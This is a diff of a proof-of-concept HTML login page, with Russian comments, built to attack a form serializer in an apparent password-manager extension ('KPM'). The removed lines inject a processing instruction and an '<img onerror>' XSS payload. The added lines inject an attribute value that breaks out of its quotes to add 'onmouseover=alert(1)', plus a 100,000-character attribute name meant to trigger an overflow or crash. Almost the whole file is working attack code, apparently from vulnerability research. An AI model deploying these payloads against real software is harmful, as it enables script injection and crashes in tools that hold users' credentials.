@@ -1,4 +1,3 @@
-<!-- evil.com/login.html -->
 <!DOCTYPE html>
 <html>
 <head><title>Login</title></head>
@@ -9,13 +8,20 @@
 </form>
 <script>
 setTimeout(() => {
-  // инжектируем в DOM то, что сломает C++ парсер
-  const pi = document.createProcessingInstruction("xml", "?>");
-  document.getElementById("f").appendChild(pi);
+  // Попробуем инжектировать через attribute values
+  const input = document.createElement('input');
+  input.type = 'text';
+  // Если encode() в WFD serializer не экранирует кавычки:
+  input.name = 'test" onmouseover="alert(1)';
+  document.getElementById('f').appendChild(input);
   
-  const d = document.createElement("div");
-  d.innerHTML = '</form><img src=x onerror=alert(1)>';
-  document.getElementById("f").appendChild(d);
+  // Длинное имя атрибута (potential overflow)
+  const longInput = document.createElement('input');
+  longInput.type = 'text';
+  longInput.name = 'A'.repeat(100000);
+  document.getElementById('f').appendChild(longInput);
+  
+  console.log('[PoC] Injected. Check if KPM crashes...');
 }, 3000);
 </script>
 </body>
